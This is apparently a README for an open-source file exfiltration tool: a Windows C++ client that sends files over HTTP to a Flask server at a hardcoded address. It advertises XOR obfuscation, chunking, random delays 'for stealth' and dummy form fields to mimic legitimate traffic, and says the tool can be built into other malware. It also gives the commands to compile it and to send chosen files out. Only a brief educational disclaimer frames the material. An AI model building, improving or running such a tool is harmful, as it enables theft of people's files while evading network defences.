# File Exfiltration Tool

## Overview
This project is to demonstrate a data exfiltration feature written in C++ with a Python-based server for a penetration testing engagement. This tool can also be intergrated into other malware funcitonalities. The tool allows you to transfer files from a client machine to a remote server over HTTP, with options for chunking, delays, and type-specific processing. The tool supports various file types (e.g., `.txt`, `.png`, `.docx`, `.pdf`), with image files transferred without encryption for direct usability, while other types are XOR-encrypted for basic obfuscation.

### Features:
- File type detection and processing (e.g., no encryption for images).
- Optional chunking to split large files into smaller pieces.
- Optional random delays between chunks for stealth.
- Base64 encoding for HTTP transmission.
- Dummy form fields to mimic legitimate traffic.
- Simple Python Flask server to receive and reassemble files.

> **Disclaimer:** This tool is for educational purposes only. Unauthorized use for malicious purposes is illegal and unethical.

## Prerequisites

### Client (C++)
- **Operating System:** Windows (uses WinHTTP API).
- **Compiler:** MSVC (e.g., `cl` via Visual Studio) or MinGW (e.g., `g++`).
- **Libraries:** WinHTTP (included with Windows).

### Server (Python)
- **Operating System:** Any (tested on Windows/Linux).
- **Python:** 3.6+.
- **Dependencies:** Flask (`pip install flask`).
- **Network:** Server must be reachable on port 80 (configurable).

## Setup

### Client

#### Clone the Repository:
```bash
git clone https://github.com/yourusername/file-exfiltration-tool.git
cd file-exfiltration-tool
```

#### Compile the C++ Code:

Using MSVC:
```bash
cl client.cpp /link winhttp.lib
```
Using MinGW:
```bash
g++ client.cpp -o client.exe -lwinhttp
```
**Output:** `client.exe`.

### Server

#### Install Dependencies:
```bash
pip install flask
```

#### Run the Server:
1. Save the Python script as `server.py`.
2. Start it on the target machine (e.g., `192.168.2.214`):
   ```bash
   python server.py
   ```
3. Ensure port `80` is open and the server is reachable.

## Usage

### Client
Run the compiled executable with the following syntax:
```bash
client.exe <file_path> [-c] [-d]
```
- `<file_path>`: Path to the file to exfiltrate (e.g., `image.png`, `doc.docx`).
- `-c`: Enable chunking (splits file into 1024-byte pieces).
- `-d`: Enable random delays (1–5 seconds between chunks, requires `-c`).

#### Examples:
Transfer a PNG file as a single piece:
```bash
client.exe image.png
```
Transfer a text file in chunks with delays:
```bash
client.exe notes.txt -c -d
```

**Output:**
- Logs bytes read, sent, and server response status.
- Success message: `"Data sent successfully to 192.168.2.214."`

### Server
- The server listens on `0.0.0.0:80` and saves received files as `exfiltrated_data.<ext>` (e.g., `exfiltrated_data.png`).
- Logs chunk reception and final file size.

#### Example Output:
```
Received chunk 1 of 3, size: 1368 bytes
Received chunk 2 of 3, size: 1368 bytes
Received chunk 3 of 3, size: 500 bytes
File fully received and saved as exfiltrated_data.png, size: 3236 bytes
```

## File Type Handling
- **Images** (`.png`, `.jpg`, `.jpeg`, `.bmp`): Transferred unencrypted.
- **Text** (`.txt`), **Office** (`.docx`, `.xlsx`), **PDF** (`.pdf`): XOR-encrypted with key `"mysecretkey"`.
- **Other Types**: Default to XOR encryption, saved with `.bin` extension if no extension is detected.

## Notes
- **Server IP:** Hardcoded to `192.168.2.214:80`. Modify `server_host` and `server_path` in `client.cpp` for a different target.
- **Chunk Size:** Fixed at `1024` bytes when chunking is enabled. Adjust `chunk_size` in `client.cpp` as needed.
- **Security:** XOR encryption is basic and not secure for real-world use; consider stronger methods for production.

## Troubleshooting
- **Empty Output File:** Check client/server logs for size mismatches or errors (e.g., `"WinHttpSendRequest failed: 12029"` = server unreachable).
- **Network Issues:** Ensure the server is running and reachable (`ping 192.168.2.214`, `telnet 192.168.2.214 80`).
- **Corrupted Images:** Verify original file integrity; test without chunking (`client.exe image.png`).

## Contributing
Feel free to fork this repository and submit pull requests with improvements (e.g., stronger encryption, more file type processors, configuration options).

## License
This project is licensed under the MIT License. See the `LICENSE` file for details.
